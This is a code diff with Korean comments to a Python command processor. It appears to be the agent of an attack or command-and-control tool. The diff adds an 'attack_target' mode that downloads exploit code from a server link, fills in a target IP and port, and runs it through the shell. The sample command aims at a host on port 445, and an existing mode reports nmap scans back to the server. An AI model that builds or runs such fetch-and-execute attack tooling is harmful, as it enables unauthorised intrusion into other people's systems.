@@ -163,6 +163,30 @@ class CommandProcessor(object):
             # 서버로 target 에 대한 nmap 결과를 보내줌
             self.reporter(parsed_res)
 
+        # 타겟 모드
+        elif cmd["type"] == "attack_target":
+            target_ip = cmd["target_ip"]
+            link = cmd['download']  # 공격 코드 다운로드 링크
+            target_port = cmd['target_port']
+
+            # 다운로드 받은 공격코드를 임시 디렉토리에 저장함
+            r = requests.get(link)
+            with open(self.path, "w") as f:
+                f.write(r.text)
+
+            replacements = [
+                ("<FILE>", self.path),
+                ("<IP>", target_ip),
+                ("<PORT>", str(target_port))
+            ]
+            usage = cmd_after_replacement(cmd['usage'], replacements)
+
+            subprocess.call(usage, shell=True)
+
+            # 타겟 공격 이후에 무엇을 해야할까?
+            pass
+
+
 
         else:
             print("non implemented")
@@ -180,5 +204,13 @@ if __name__ == "__main__":
         "target_ip": "localhost",
     }
 
-    cp = CommandProcessor(scan, "http://0.0.0.0:9000/", 1)
+    target = {
+        "type": "attack_target",
+        "target_ip": "172.30.1.26",
+        "download": f"http://localhost:9000/exploit/1",
+        "target_port": 445,
+        "usage": "python <FILE> <IP>",
+    }
+
+    cp = CommandProcessor(target, "http://0.0.0.0:9000/", 1)
     cp.run()
